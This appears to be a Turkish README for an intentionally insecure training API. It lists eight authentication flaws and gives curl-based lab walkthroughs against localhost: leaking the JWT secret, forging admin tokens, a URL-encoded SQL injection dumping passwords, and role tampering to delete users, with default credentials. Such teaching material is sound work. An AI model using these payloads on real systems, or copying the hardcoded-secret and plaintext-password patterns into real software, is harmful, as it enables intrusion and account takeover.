# ?? AuthController - Güvenlik Zafiyetleri Özet

## ?? Bu Controller Kasýtlý Olarak Güvensizdir!

AuthController, **8 kritik güvenlik zafiyeti** içermektedir. Bu zafiyet **eðitim amaçlýdýr**.

---

## ?? Kritik Zafiyetler (Hýzlý Bakýþ)

| # | Zafiyet | Saldýrý Kolaylýðý | Etki |
|---|---------|-------------------|------|
| 1 | **Zayýf Þifre Politikasý** | ????? Çok Kolay | Brute force saldýrýlarý |
| 2 | **Düz Metin Þifre** | ????? Çok Kolay | Tüm þifreler okunabilir |
| 3 | **Hardcoded Secret Key** | ???? Kolay | Sahte token üretme |
| 4 | **Token Manipulation** | ??? Orta | Yetki yükseltme |
| 5 | **Aþýrý Token Süresi** | ???? Kolay | Çalýnan token uzun süre geçerli |
| 6 | **Hassas Veri Loglama** | ???? Kolay | Þifre ve token ifþasý |
| 7 | **Secret Key Ýfþasý** | ????? Çok Kolay | Sistem tamamen ele geçirilebilir |
| 8 | **Yetkisiz Token Üretimi** | ????? Çok Kolay | Anýnda admin eriþimi |

---

## ?? Hýzlý Saldýrý Kýlavuzu

### 1?? En Kolay Saldýrý: Anýnda Admin Olma (30 saniye)

```bash
# Adým 1: Secret key'i al
curl http://localhost:5000/api/auth/secret-key

# Adým 2: Admin token üret
curl -X POST http://localhost:5000/api/auth/generate-token \
  -H "Content-Type: application/json" \
  -d '{"userId":999,"username":"hacker","role":"Admin"}'

# Adým 3: Admin yetkilerini test et
curl http://localhost:5000/api/auth/verify \
  -H "Authorization: Bearer {yukarýdaki_token}"

# ? BAÞARILI! Artýk admin'sin!
```

**Sonuç:** Hiçbir hesap oluþturmadan, þifre bilmeden admin oldun!

---

### 2?? SQL Injection + Þifre Çalma (1 dakika)

```bash
# Adým 1: SQL Injection ile þifreleri çek
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22Password%22,%20%22Email%22,%200,%200,%20%22CreatedAt%22%20FROM%20%22Users%22--"

# Yanýt:
# [
#   {"id": 1, "name": "admin", "description": "admin123", ...},
#   {"id": 2, "name": "john", "description": "12345", ...}
# ]

# Adým 2: Admin þifresiyle login ol
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# ? BAÞARILI! Admin token'ý aldýn!
```

---

### 3?? Token Manipulation (2 dakika)

```bash
# Adým 1: Normal kullanýcý olarak login
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}'

# Adým 2: Token'ý decode et
curl -X POST http://localhost:5000/api/auth/decode-token \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJhbG..."}'

# Adým 3: jwt.io'ya git ve þunlarý yap:
# - Secret: ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!
# - Payload'da "role": "User" ? "role": "Admin" deðiþtir
# - Yeni token'ý kopyala

# Adým 4: Yeni token ile admin iþlemi yap
curl -X DELETE http://localhost:5000/api/user/1 \
  -H "Authorization: Bearer {yeni_admin_token}"

# ? BAÞARILI! Admin kullanýcýsýný sildin!
```

---

## ?? Vulnerable Endpoint'ler

### ?? Kritik Seviye

| Endpoint | Method | Zafiyet | Sonuç |
|----------|--------|---------|-------|
| `/api/auth/secret-key` | GET | Secret key ifþa ediyor | Herkes admin token üretebilir |
| `/api/auth/generate-token` | POST | Yetkisiz token üretimi | Anýnda admin eriþimi |
| `/api/auth/register` | POST | Zayýf þifre + Düz metin | Kolay brute force |

### ?? Yüksek Seviye

| Endpoint | Method | Zafiyet | Sonuç |
|----------|--------|---------|-------|
| `/api/auth/login` | POST | Hardcoded secret + Loglama | Token forge edilebilir |
| `/api/auth/decode-token` | POST | Token yapýsýný açýða çýkarýyor | Saldýrý ipuçlarý |

---

## ??? Test Araçlarý

### Postman Collection

```json
{
  "info": {
    "name": "Vulnerable Auth API",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "1. Get Secret Key",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/api/auth/secret-key"
      }
    },
    {
      "name": "2. Generate Admin Token",
      "request": {
        "method": "POST",
  "url": "{{baseUrl}}/api/auth/generate-token",
    "body": {
          "raw": "{\"userId\":999,\"username\":\"admin\",\"role\":\"Admin\"}"
        }
      }
},
{
      "name": "3. Verify Admin Token",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/api/auth/verify",
        "header": [
        {"key": "Authorization", "value": "Bearer {{adminToken}}"}
]
      }
    }
  ]
}
```

**Kullaným:**
1. Postman'de Import ? Raw Text
2. Yukarýdaki JSON'u yapýþtýr
3. `baseUrl` variable'ýný `http://localhost:5000` olarak ayarla
4. Sýrayla çalýþtýr

---

## ?? Öðrenme Yolu

### Baþlangýç Seviyesi
1. ? `GET /api/auth/secret-key` - Secret key'i al
2. ? `POST /api/auth/generate-token` - Admin token üret
3. ? `GET /api/auth/verify` - Token'ý doðrula

**Süre:** 5 dakika  
**Zorluk:** ? Çok Kolay

### Orta Seviye
1. ? Normal kullanýcý olarak register ol
2. ? Login ol ve token al
3. ? `POST /api/auth/decode-token` ile token'ý incele
4. ? jwt.io'da token'ý manipüle et
5. ? Manipüle edilmiþ token ile admin iþlemi yap

**Süre:** 15 dakika  
**Zorluk:** ?? Orta

### Ýleri Seviye
1. ? SQL Injection ile admin þifresini bul
2. ? Admin olarak login ol
3. ? IDOR ile baþka kullanýcýlarýn verilerini çek
4. ? Mass Assignment ile kendi hesabýný admin yap
5. ? Tüm kullanýcýlarý sil

**Süre:** 30 dakika  
**Zorluk:** ??? Zor

---

## ?? Detaylý Dökümanlar

- **[AUTH_ZAFIYETLER_TR.md](./AUTH_ZAFIYETLER_TR.md)** - Tüm zafiyetlerin detaylý Türkçe açýklamasý
- **[JWT_ATTACK_GUIDE.md](./JWT_ATTACK_GUIDE.md)** - JWT saldýrý teknikleri (Ýngilizce)

---

## ?? Sýk Sorulan Sorular

### S: Token'ý nerede kullanabilirim?
**C:** Tüm `[Authorize]` attribute'una sahip endpoint'lerde:
```bash
curl -H "Authorization: Bearer {token}" http://localhost:5000/api/user/1
```

### S: Secret key'i nasýl kullanýrým?
**C:** [jwt.io](https://jwt.io)'da:
1. Sol tarafta payload'ý düzenle
2. Sað altta "VERIFY SIGNATURE" kýsmýna secret key'i yapýþtýr
3. Oluþan token'ý kopyala

### S: Algorithm confusion saldýrýsý çalýþmýyor?
**C:** Program.cs'de `ValidateIssuerSigningKey = true` olduðu için bu saldýrý çalýþmayabilir. Bunun yerine:
- `/api/auth/secret-key` ile secret'ý al
- jwt.io'da valid token üret

### S: Hangi kullanýcýlar var?
**C:** Varsayýlan kullanýcýlar:
```
admin / admin123 (Admin)
john / 12345 (User)
jane / password (User)
```

---

## ?? Güvenlik Uyarýsý

Bu API **eðitim amaçlý** güvenlik açýklarý içerir:

### ? Asla Yapma
- Baþkasýnýn sisteminde test etme
- Ýzin almadan penetrasyon testi yapma
- Production'da bu kodu kullanma
- Öðrendiklerini kötüye kullanma

### ? Her Zaman Yap
- Kendi test ortamýnda çalýþ
- Etik kurallara uy
- Güvenli kodlama pratikleri öðren
- Zafiyetleri sorumlu þekilde bildir

---

## ?? Hedef: Her Zafiyeti Öðren!

- [ ] Zayýf þifre politikasý
- [ ] Düz metin þifre saklama
- [ ] Hardcoded secret key
- [ ] JWT token manipülasyonu
- [ ] Aþýrý uzun token süresi
- [ ] Hassas veri loglama
- [ ] Secret key ifþasý
- [ ] Yetkisiz token üretimi

**Tümünü tamamladýn mý? Artýk güvenli API'ler yazabilirsin! ??**

---

## ?? Ýletiþim

Sorularýnýz için:
- GitHub Issues
- Security@training.local (simüle edilmiþ)

---

**?? Güvenli kodlama!**
